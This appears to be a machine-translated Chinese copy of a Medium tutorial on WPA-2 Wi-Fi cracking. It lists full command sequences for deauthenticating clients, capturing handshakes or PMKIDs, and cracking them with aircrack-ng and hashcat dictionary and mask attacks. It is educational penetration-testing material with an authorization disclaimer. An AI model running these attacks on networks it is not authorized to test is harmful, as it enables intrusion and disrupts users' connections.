<html>
<head>
<title>Wireless Penetration Testing (WPA-2 Cracking)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">无线渗透测试(WPA-2破解)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/wireless-penetration-testing-wpa-2-cracking-9c925e51a873?source=collection_archive---------0-----------------------#2022-05-16">https://infosecwriteups.com/wireless-penetration-testing-wpa-2-cracking-9c925e51a873?source=collection_archive---------0-----------------------#2022-05-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="9241" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在本文中，我将讨论无线渗透测试和破解WPA-2保护的Wifi。我将谈论我们可以用来测试WPA-2网络的两种不同的方法。所以，我们进入正题:)</p><blockquote class="kl km kn"><p id="b3a0" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">注意:</strong>本文仅用于教育目的。你必须只在你合法拥有的或者你有许可测试的网络上进行测试。</p></blockquote><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi ks"><img src="../Images/791968e26bc4be82e079be7b80f19743.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*B5dpDH2bn5dUuA0e"/></div></div><figcaption class="le lf gj gh gi lg lh bd b be z dk translated">由<a class="ae li" href="https://unsplash.com/@extaf_ms?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank">米沙·费舍切克</a>在<a class="ae li" href="https://unsplash.com?utm_source=medium&amp;utm_medium=referral" rel="noopener ugc nofollow" target="_blank"> Unsplash </a>上拍摄的照片</figcaption></figure><p id="0f11" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有两种方法，我们可以使用，一个是捕获全程握手，第二个是通过使用hcxdumptool。一旦我们得到了散列文件或握手文件，我们就可以使文件离线并破解散列。所以基本上，我们将通过两种方式获得散列文件，然后我们需要使用Hashcat来破解散列。</p><p id="4579" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ko">先决条件:</em></p><ol class=""><li id="900b" class="lj lk iq jp b jq jr ju jv jy ll kc lm kg ln kk lo lp lq lr bi translated">Wifi适配器(支持监控模式)。</li><li id="87ac" class="lj lk iq jp b jq ls ju lt jy lu kc lv kg lw kk lo lp lq lr bi translated">一台Linux机器。</li><li id="18ad" class="lj lk iq jp b jq ls ju lt jy lu kc lv kg lw kk lo lp lq lr bi translated">airmon-ng、airodump-ng、aircrack-ng(用于方法1)</li><li id="76bf" class="lj lk iq jp b jq ls ju lt jy lu kc lv kg lw kk lo lp lq lr bi translated">hcxdumptool和hcxtools(用于方法2)</li><li id="282c" class="lj lk iq jp b jq ls ju lt jy lu kc lv kg lw kk lo lp lq lr bi translated">哈希卡特</li><li id="6883" class="lj lk iq jp b jq ls ju lt jy lu kc lv kg lw kk lo lp lq lr bi translated">您有权测试的Wifi网络。</li></ol><h1 id="bd87" class="lx ly iq bd lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu bi translated">1.捕获全程握手(airodump-ng)</h1><p id="32e6" class="pw-post-body-paragraph jn jo iq jp b jq mv js jt ju mw jw jx jy mx ka kb kc my ke kf kg mz ki kj kk ij bi translated">我知道这种破解wifi密码的老方法，但它仍然工作得很好。在这个方法中，我们将通过向网络上的用户发送de-auth信号来捕获一次完全的握手。</p><p id="d924" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">通过输入以下命令安装所需的软件</p><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="a6bb" class="nf ly iq nb b gy ng nh l ni nj">sudo apt install aircrack-ng</span></pre><p id="2b64" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先让网络接口进入监控模式。键入以下命令启动监控模式。</p><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="d18b" class="nf ly iq nb b gy ng nh l ni nj">iwconfig</span><span id="c3a7" class="nf ly iq nb b gy nk nh l ni nj">sudo airmon-ng check kill</span><span id="765a" class="nf ly iq nb b gy nk nh l ni nj">sudo airmon-ng start wlp8s0</span></pre><p id="ab23" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里，wlp8s0是我的网络接口。</p><p id="4362" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">键入iwconfig，确保监控模式已启动。</p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi nl"><img src="../Images/9f3dcd86b2a09ed0eecb952c452a4de2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GHrdnXnM-1fCjTQzPB65bg.png"/></div></div></figure><p id="300d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们可以使用airodump-ng来列出所有的wifi网络</p><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="f1a4" class="nf ly iq nb b gy ng nh l ni nj">sudo airodump-ng wlp8s0mon</span></pre><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi nm"><img src="../Images/cda2fcf1f898f661f34eb7551a3ceca9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-IIeWLFj5AKle0v2FKmhLQ.png"/></div></div></figure><p id="dd1c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它将显示网络BSSID和网络的信道(CH)细节。</p><p id="3cf1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">复制目标Wifi BSSID和CH。</p><p id="08a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，使用下面的命令开始转储一个完全握手</p><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="e683" class="nf ly iq nb b gy ng nh l ni nj">sudo airodump-ng -c 6 --bssid A6:0C:ID:ID:ID:ID -w filename wlp8s0mon</span></pre><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi nm"><img src="../Images/2cf842c654111a3f3dfa8fc30691902d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*s7WQCy89aZjAGTliJ-GhFw.png"/></div></div></figure><p id="61f8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它开始监听握手。我们可以看到连接到目标网络的设备。为了捕获全程握手，我们需要向目标网络上的用户发送一个de-auth信号。要发送解除授权信号，请打开一个新的终端选项卡，并使用以下命令。</p><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="facf" class="nf ly iq nb b gy ng nh l ni nj">sudo aireplay-ng -0 1 -a WIFI:BSSID -c DEVICE:BSSID wlp8s0mon</span></pre><p id="35a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦身份验证完成，返回到先前的终端。您可以看到WPA握手被捕获。现在，您可以按ctrl+c来停止该过程。</p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi nm"><img src="../Images/9cc14a8498add373b7ff782389185b8c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mcA5ENxGTpd-ck6b_1RaQg.png"/></div></div></figure><p id="69b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们有了filename.cap文件。我们可以使用aircrack-ng来破解密码，也可以将filename.cap转换为hash.hc22000，然后使用hashcat来破解哈希。</p><ul class=""><li id="6da6" class="lj lk iq jp b jq jr ju jv jy ll kc lm kg ln kk nn lp lq lr bi translated">要使用aircrack-ng破解，请使用以下命令。</li></ul><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="147f" class="nf ly iq nb b gy ng nh l ni nj">aircrack-ng -w rockyou.txt -b BSSID filename.cap</span></pre><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi no"><img src="../Images/2e39b70c3f1eb72138e841eb8cf77e03.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*S-qTLpHjc2YpozJH2U5ewQ.png"/></div></div></figure><ul class=""><li id="b0bf" class="lj lk iq jp b jq jr ju jv jy ll kc lm kg ln kk nn lp lq lr bi translated">要转换。使用下面的网站。</li></ul><blockquote class="kl km kn"><p id="2f6f" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><a class="ae li" href="https://hashcat.net/cap2hashcat/" rel="noopener ugc nofollow" target="_blank">https://hashcat.net/cap2hashcat/</a></p></blockquote><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi np"><img src="../Images/4b9fd4fd0e7163856fb0f2906f12148a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*c-Q8ziQuyYORXF7iXyT5Mg.png"/></div></div></figure><p id="380b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在网站上传filename.cap，可以下载转换后的hash.hc22000文件。</p><h1 id="f135" class="lx ly iq bd lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu bi translated">2.使用hcxdumptool</h1><p id="4931" class="pw-post-body-paragraph jn jo iq jp b jq mv js jt ju mw jw jx jy mx ka kb kc my ke kf kg mz ki kj kk ij bi translated">这种方法简单易行，并且不需要向网络上的用户发送去授权信号。</p><p id="9057" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从以下链接安装hcxdumptool和hcxtools:</p><blockquote class="kl km kn"><p id="346d" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><a class="ae li" href="https://github.com/ZerBea/hcxdumptool" rel="noopener ugc nofollow" target="_blank">https://github.com/ZerBea/hcxdumptool</a></p><p id="2ed6" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated">https://github.com/ZerBea/hcxtools<a class="ae li" href="https://github.com/ZerBea/hcxtools" rel="noopener ugc nofollow" target="_blank"/></p></blockquote><p id="6aaf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦安装了所需的软件，请按照流程操作。</p><p id="5f93" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，使用以下命令停止网络管理器和Wpa请求程序。</p><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="bb4d" class="nf ly iq nb b gy ng nh l ni nj">sudo systemctl stop NetworkManager.service<br/>sudo systemctl stop wpa_supplicant.service</span></pre><p id="1c63" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，启动hcxdumptool来转储pcapng文件。</p><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="217e" class="nf ly iq nb b gy ng nh l ni nj">sudo hcxdumptool -i wlp8s0 -o dumpfile.pcapng --active_beacon --enable_status=15</span></pre><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi nq"><img src="../Images/bc4937983729bba4a53fd99c1801d9fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*orAf8n9x53b6sUnomEQ-IA.png"/></div></div></figure><p id="91dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">一旦开始，我们可以等待一些捕获足够的数据包。然后，用ctrl+c停止这个过程。</p><p id="fc59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们的机器中有了dumpfile.pcapng文件。通过以下命令启动网络管理器和wpa恳求者服务。</p><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="e662" class="nf ly iq nb b gy ng nh l ni nj">sudo systemctl start wpa_supplicant.service<br/>sudo systemctl start NetworkManager.service</span></pre><p id="ff21" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，我们必须转换。pcapng文件转换为可破解的. hc22000文件。为此，请使用以下命令。</p><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="6a8b" class="nf ly iq nb b gy ng nh l ni nj">hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng</span></pre><p id="dc5f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，我们有了hash.hc22000文件，可以使用hashcat来破解它。</p><h1 id="0945" class="lx ly iq bd lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr ms mt mu bi translated">3.开裂哈希卡</h1><p id="cab9" class="pw-post-body-paragraph jn jo iq jp b jq mv js jt ju mw jw jx jy mx ka kb kc my ke kf kg mz ki kj kk ij bi translated">从https://hashcat.net/hashcat<a class="ae li" href="https://hashcat.net/hashcat/" rel="noopener ugc nofollow" target="_blank">下载hashcat的最新版本</a></p><ul class=""><li id="8aed" class="lj lk iq jp b jq jr ju jv jy ll kc lm kg ln kk nn lp lq lr bi translated">使用hashcat的字典攻击(wordlist)。</li></ul><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="bd54" class="nf ly iq nb b gy ng nh l ni nj">hashcat -m 22000 hash.hc22000 rockyou.txt</span></pre><ul class=""><li id="9cf4" class="lj lk iq jp b jq jr ju jv jy ll kc lm kg ln kk nn lp lq lr bi translated">使用hashcat的暴力。</li></ul><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="f3da" class="nf ly iq nb b gy ng nh l ni nj">hahscat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d</span></pre><p id="ec38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以上命令用于暴力破解一个8位数的密码。</p><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="f589" class="nf ly iq nb b gy ng nh l ni nj">hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d?d?d</span></pre><p id="7fd0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您还可以形成一个10位数字的密码模式，并以9开头。</p><pre class="kt ku kv kw gt na nb nc nd aw ne bi"><span id="5801" class="nf ly iq nb b gy ng nh l ni nj">hashcat -m 22000 hash.hc22000 -a 3 9?d?d?d?d?d?d?d?d?d</span></pre><p id="06c6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要制作自己的面具图案，请参考以下来自hashcat的指南。</p><blockquote class="kl km kn"><p id="31f8" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><a class="ae li" href="https://hashcat.net/wiki/doku.php?id=mask_attack" rel="noopener ugc nofollow" target="_blank">https://hashcat.net/wiki/doku.php?id=mask_attack</a></p></blockquote><p id="37f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢您阅读我的文章。希望这对你有用。</p><p id="483f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请分享并关注我更多有趣的文章:)</p></div></div>    
</body>
</html>